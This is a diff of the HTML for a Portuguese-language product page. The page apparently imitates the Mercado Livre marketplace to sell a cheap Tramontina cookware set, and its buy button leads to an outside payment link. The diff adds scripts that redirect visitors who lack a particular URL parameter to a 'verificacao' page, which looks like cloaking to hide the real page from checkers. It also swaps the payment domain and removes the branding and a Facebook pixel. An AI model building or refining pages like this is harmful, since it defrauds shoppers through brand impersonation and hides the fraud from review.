@@ -1,80 +1,41 @@
 <!DOCTYPE html><html lang="pt"><head>
+<script>
+(function() {
+  var params = new URLSearchParams(window.location.search);
+  if (!params.has("v")) {
+    window.location.replace("verificacao.html" + window.location.search);
+  }
+})();
+</script>
+<script>
+if (window.location.pathname.endsWith('/index.html') || window.location.pathname.endsWith('index.html')) {
+  window.location.replace('verificacao.html' + window.location.search);
+}
+</script>
+<script>
+  window.pixelId = "66a3fc115f57e7496bcf1525";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
     <meta charset="UTF-8">
 
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <title>Mercado Livre</title>
+    <title>Mercado Ofertas</title>
     <link rel="stylesheet" href="css/products.css">
     <link rel="stylesheet" href="css/styles.css">
     <link rel="stylesheet" href="css/fonts.css">
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,1,0">
-    <script src="js/tempo.js"></script>
-      <script>
-    var timer = setInterval(function () {
-        const location = new URL(document.location.href);
-        const fields = ["src", "sck", "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term"];
-        var links = document.getElementsByTagName("a");
-
-        for (var i = 0, n = links.length; i < n; i++) {
-            if (links[i].href.includes("#")) continue;
-            if (links[i].href) {
-                let link = new URL(links[i].href);
-                fields.forEach(field => {
-                    if (location.searchParams.get(field))
-                        link.searchParams.set(field, location.searchParams.get(field));
-                });
-                let href = link.href;
-                links[i].href = href;
-            }
-        }
-    }, 500);
-<!-- UTMIFY -->
-<script>
-window.pixelId="66a3fc115f57e7496bcf1525";
-var a=document.createElement("script");
-a.async=true;
-a.defer=true;
-a.src="https://cdn.utmify.com.br/scripts/pixel/pixel.js";
-document.head.appendChild(a);
-</script>
-
-<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" async defer></script>
-
-<!-- FACEBOOK -->
-<script>
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;
-
-n.push=n;
-n.loaded=true;
-n.version='2.0';
-n.queue=[];
-
-t=b.createElement(e);
-t.async=true;
-t.src=v;
-
-s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s);
-
-}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-
-fbq('init','837477982232450');
-
-fbq('track','PageView');
-fbq('track','ViewContent');
-
-
-</script>
+    
 
 
 
 
 <body>
    
-    <div style="background-color: #e6cf00; text-align: center; padding: 5px; font-family: 'GellixMedium'; font-size: 13px; color: white">Promoção exclusiva: 26 anos</div>
+    <div style="background-color: #e6cf00; text-align: center; padding: 5px; font-family: 'GellixMedium'; font-size: 13px; color: white">Promoção exclusiva</div>
 
     <nav class="navbar" style="padding-top: 15px;">
         <div class="menu-icon" style="padding-left: 3%;" onclick="window.location.href='index.html' + window.location.search;">
@@ -82,7 +43,7 @@ fbq('track','ViewContent');
         </div>
 
         <div class="logo-central">
-            <img src="images/logo.webp" style="height: 5vh;" alt="Logo Central Vivara">
+            
         </div>
 
         <div class="menu-icon" style="padding-right: 3%;">
@@ -143,25 +104,12 @@ fbq('track','ViewContent');
     <button class="pergunta-botao"
 onclick="
 
-fbq('track','AddToCart',{
-content_name:'Jogo de Panelas Tramontina Paris',
-content_ids:['panelastramontina'],
-content_type:'product',
-value:99.00,
-currency:'BRL'
-});
 
-fbq('track','InitiateCheckout',{
-content_name:'Jogo de Panelas Tramontina Paris',
-content_ids:['panelastramontina'],
-content_type:'product',
-value:99.00,
-currency:'BRL',
-num_items:1
-});
+
+
 
 setTimeout(function(){
-window.open('https://pay.comprasreaisdodia.com/bz5KZbVQabKZ7dL'+window.location.search,'_self');
+window.open('https://pay.comprasreaisdodia.shop/bz5KZbVQabKZ7dL'+window.location.search,'_self');
 },500);
 
 ">
@@ -308,3 +256,7 @@ window.open('https://pay.comprasreaisdodia.com/bz5KZbVQabKZ7dL'+window.location.
 
 
 </body></html>
+
+
+
+
